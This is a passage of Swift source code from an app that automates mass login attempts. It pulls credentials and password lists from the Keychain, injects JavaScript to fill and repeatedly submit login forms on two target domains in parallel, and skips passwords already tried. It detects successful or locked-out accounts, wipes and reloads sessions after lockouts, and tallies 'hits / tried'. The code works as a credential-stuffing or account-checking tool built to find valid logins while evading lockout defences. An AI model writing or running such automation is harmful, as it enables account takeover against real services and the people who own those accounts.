                targetDomain: self.dualQuadTargetDomainA, lane: lane
            )
        }
        Task {
            await self.runDualSide(
                session: sB, credential: credential, targetURL: urlB,
                targetDomain: self.dualQuadTargetDomainB, lane: lane
            )
        }
    }

    /// Runs ONE side (URL A or URL B) of a lane's current credential —
    /// fetches/filters passwords, burns+reloads first if the previous round
    /// left a pending "been disabled" burn for this session, navigates if
    /// needed, then hands off to `attemptFillDual`.
    private func runDualSide(
        session s: QuadSession,
        credential: Credential,
        targetURL: URL,
        targetDomain: String,
        lane: Int
    ) async {
        guard dualQuadActive, s.rcrRunning else { return }

        if TempDisabledStore.shared.isDisabled(credentialID: credential.id) {
            finishDualSide(session: s, lane: lane, status: .tempDisabled)
            return
        }
        if PermaDisabledStore.shared.isDisabled(credentialID: credential.id) {
            finishDualSide(session: s, lane: lane, status: .disabled)
            return
        }

        let credID = credential.id
        let allPasswords = await Task.detached {
            KeychainService.shared.getPasswords(for: credID)
        }.value
        guard !allPasswords.isEmpty else {
            finishDualSide(session: s, lane: lane, status: .failed)
            return
        }

        let tracker = AttemptTrackingService.shared
        let filtered: [String]
        if let context = modelContext {
            if retryFailed {
                filtered = allPasswords.filter { pw in
                    !tracker.isTerminallyAttempted(
                        context: context, credentialID: credID,
                        passwordHash: PasswordFingerprint.hash(pw), targetDomain: targetDomain
                    )
                }
            } else {
                let descriptor = FetchDescriptor<AttemptRecord>(
                    predicate: #Predicate<AttemptRecord> { rec in
                        rec.credentialID == credID
                            && rec.targetDomain == targetDomain
                            && rec.statusRaw != "pending"
                            && rec.statusRaw != "skipped"
                    }
                )
                let attempted = Set(((try? context.fetch(descriptor)) ?? []).map { $0.passwordHash })
                filtered = allPasswords.filter { !attempted.contains(PasswordFingerprint.hash($0)) }
            }
        } else {
            filtered = allPasswords
        }

        guard !filtered.isEmpty else {
            finishDualSide(session: s, lane: lane, status: .failed)
            return
        }

        s.rcrPasswords = filtered
        s.rcrPasswordIndex = 0
        s.rcrTargetURL = targetURL
        s.rcrCurrentDomain = targetDomain

        // A permanent disable on the previous round for this window needs a
        // full burn + fresh reload (and cookie-notice wait) before we try
        // the next credential here — regardless of the current URL.
        if dualNeedsBurn[s.index] == true {
            dualNeedsBurn[s.index] = false
            s.rcrStatus = .burning
            s.rcrBurnFlash &+= 1
            await QuadDataStore.burn(index: s.index)
            guard dualQuadActive, s.rcrRunning else { return }
            s.rcrStatus = .navigating
            s.rcrAwaitingNavigation = true
            s.url = targetURL
            s.webView?.load(URLRequest(url: targetURL))
            return
        }

        let liveURL = s.webView?.url ?? s.url
        if !sameTarget(liveURL, targetURL) {
            s.rcrStatus = .navigating
            s.rcrAwaitingNavigation = true
            s.url = targetURL
            s.webView?.load(URLRequest(url: targetURL))
            return
        }

        await attemptFillDual(session: s, lane: lane)
    }

    private func attemptFillDual(session s: QuadSession, lane: Int) async {
        guard dualQuadActive, s.rcrRunning, !s.rcrPasswords.isEmpty else { return }
        guard let credential = currentDualCredential(s) else {
            finishDualSide(session: s, lane: lane, status: .failed)
            return
        }
        let password = s.rcrPasswords[s.rcrPasswordIndex]
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let siteSetting = browserViewModel?.fetchSiteSetting(for: targetDomain)

        s.rcrStatus = .filling
        let fillScript = JavaScriptInjectionService.fillCredentialScript(
            username: credential.username,
            password: password,
            usernameSelector: siteSetting?.usernameSelector,
            passwordSelector: siteSetting?.passwordSelector,
            suppressKeyboard: true
        )
        _ = try? await s.webView?.evaluateJavaScript(fillScript)

        s.rcrStatus = .submitting
        let submitScript = JavaScriptInjectionService.submitFormScript(
            submitSelector: siteSetting?.submitButtonSelector
        )
        _ = try? await s.webView?.evaluateJavaScript(submitScript)

        let extraCount = max(0, UserDefaults.standard.integer(forKey: "rcrExtraSubmits"))
        let rawDelay = UserDefaults.standard.double(forKey: "rcrSubmitDelay")
        let delay = rawDelay > 0 ? rawDelay : 1.5
        if extraCount > 0 {
            s.rcrExtraSubmitsInFlight = true
            for _ in 0..<extraCount {
                try? await Task.sleep(for: .seconds(delay))
                guard s.rcrRunning, dualQuadActive else { s.rcrExtraSubmitsInFlight = false; return }
                _ = try? await s.webView?.evaluateJavaScript(submitScript)

                try? await Task.sleep(for: .seconds(0.35))
                guard s.rcrRunning, dualQuadActive else { s.rcrExtraSubmitsInFlight = false; return }
                let rawState = try? await s.webView?.evaluateJavaScript(
                    JavaScriptInjectionService.pageStateSnapshotScript()
                )
                if let payload = JavaScriptInjectionService.parsePageState(rawState),
                   JavaScriptInjectionService.isTerminalRCRState(payload) {
                    s.rcrExtraSubmitsInFlight = false
                    s.rcrStatus = .waiting
                    handleDualQuadMessage(session: s, payload: payload)
                    return
                }
            }
            s.rcrExtraSubmitsInFlight = false
        }

        credential.lastUsedAt = Date()
        credential.usageCount += 1
        try? modelContext?.save()

        if let context = modelContext {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credential.id,
                username: credential.username,
                password: password,
                passwordIndex: s.rcrPasswordIndex + 1,
                passwordTotal: s.rcrPasswords.count,
                targetDomain: targetDomain,
                sessionTag: s.sessionTag,
                status: .pending
            )
        }

        s.rcrStatus = .waiting
        let installScript = JavaScriptInjectionService.rcrInstallObserverScript()
        _ = try? await s.webView?.evaluateJavaScript(installScript)
    }

    private func handleDualQuadMessage(session s: QuadSession, payload: [String: Any]) {
        guard dualQuadActive, s.rcrRunning, s.rcrStatus == .waiting else { return }
        if s.rcrExtraSubmitsInFlight { return }
        let lane = laneIndex(for: s)
        guard let credential = currentDualCredential(s) else {
            finishDualSide(session: s, lane: lane, status: .failed)
            return
        }

        let hasPassword = payload["hasPassword"] as? Bool ?? false
        let hasWelcome = payload["hasWelcome"] as? Bool ?? false
        let hasDisabled = payload["hasDisabled"] as? Bool ?? false
        let hasTempDisabled = payload["hasTempDisabled"] as? Bool ?? false
        let hasSuccess = payload["hasSuccess"] as? Bool ?? false
        let isHomepage = payload["isHomepage"] as? Bool ?? false
        let password = s.rcrPasswords[safe: s.rcrPasswordIndex] ?? ""

        if hasWelcome || hasSuccess || (isHomepage && !hasPassword) {
            s.rcrSuccessCount += 1
            s.rcrStatus = .success
            captureAndRecord(session: s, credential: credential, password: password, status: .success)
            browserViewModel?.showToast("Login succeeded — \(credential.username)")
            finishDualSide(session: s, lane: lane, status: .success)
            return
        }

        if hasDisabled {
            captureAndRecord(session: s, credential: credential, password: password, status: .disabled)
            // Defer the actual burn until this window is reused for the
            // lane's next credential — avoids burning while still waiting
            // on the partner side.
            dualNeedsBurn[s.index] = true
            finishDualSide(session: s, lane: lane, status: .disabled)
            return
        }

        if hasTempDisabled {
            captureAndRecord(session: s, credential: credential, password: password, status: .tempDisabled)
            let hasMultiplePasswords = s.rcrPasswords.count > 1
            if hasMultiplePasswords {
                TempDisabledStore.shared.markDisabled(credentialID: credential.id)
                browserViewModel?.showToast("Temp-disabled — \(credential.username)")
                finishDualSide(session: s, lane: lane, status: .tempDisabled)
            } else if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                s.rcrPasswordIndex += 1
                Task { await self.attemptFillDual(session: s, lane: lane) }
            } else {
                finishDualSide(session: s, lane: lane, status: .tempDisabled)
            }
            return
        }

        if hasPassword {
            captureAndRecord(session: s, credential: credential, password: password, status: .failed)
            if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                s.rcrPasswordIndex += 1
                Task { await self.attemptFillDual(session: s, lane: lane) }
            } else {
                finishDualSide(session: s, lane: lane, status: .failed)
            }
        }
    }

    /// Records this session's side result for the lane's current credential.
    /// Once BOTH sides have reported in, finalizes the pairing exactly once.
    private func finishDualSide(session s: QuadSession, lane: Int, status: AttemptRecord.Status) {
        guard dualQuadActive else { return }
        if isASide(s) {
            laneStates[lane].resultA = status
        } else {
            laneStates[lane].resultB = status
        }
        s.rcrStatus = .pairWait

        guard let resultA = laneStates[lane].resultA, let resultB = laneStates[lane].resultB else {
            // Still waiting on the other URL's result for this credential.
            return
        }
        guard !laneStates[lane].finalizing else { return }
        laneStates[lane].finalizing = true
        finalizeLane(lane: lane, resultA: resultA, resultB: resultB)
    }

    /// Applies the paired deletion rule: only delete when a permanent
    /// disable is paired with another removal-safe result (another
    /// permanent disable, or an ordinary login failure). Never delete when
    /// paired with success or temp-disabled — those credentials are kept.
    private func finalizeLane(lane: Int, resultA: AttemptRecord.Status, resultB: AttemptRecord.Status) {
        guard let credential = laneStates[lane].credentials[safe: laneStates[lane].index] else {
            advanceLane(lane: lane)
            return
        }

        let keepStatuses: Set<AttemptRecord.Status> = [.success, .tempDisabled]
        let isRemovalSafe = (resultA == .disabled || resultB == .disabled)
            && !keepStatuses.contains(resultA)
            && !keepStatuses.contains(resultB)

        if isRemovalSafe {
            PermaDisabledStore.shared.markDisabled(credentialID: credential.id)
            deleteCredentialPermanently(credential)
            browserViewModel?.showToast("Removed (disabled) — \(credential.username)")
        }

        for s in [sessionA(forLane: lane), sessionB(forLane: lane)] {
            s.rcrCompletedIDs.insert(credential.id)
        }
        if laneCompletedCounts.indices.contains(lane) {
            laneCompletedCounts[lane] += 1
        }

        advanceLane(lane: lane)
    }

    private func advanceLane(lane: Int) {
        laneStates[lane].index += 1
        assignNextCredential(lane: lane)
    }

    private func checkDualQuadAllFinished() {
        guard dualQuadActive else { return }
        let allLanesDone = laneStates.allSatisfy { $0.index >= $0.credentials.count }
        guard allLanesDone else { return }
        let stillWorking = enabledSessions.contains { $0.rcrRunning && $0.rcrStatus != .finished }
        guard !stillWorking else { return }
        dualQuadActive = false
        lastCompletedAt = Date()
        let totalSuccess = enabledSessions.reduce(0) { $0 + $1.rcrSuccessCount }
        let totalTried = laneStates.reduce(0) { $0 + $1.credentials.count }
        browserViewModel?.showToast("Dual RCR complete — \(totalSuccess) hits / \(totalTried) tried")
    }
}

private extension Array {
    subscript(safe index: Int) -> Element? {
        indices.contains(index) ? self[index] : nil
    }
}
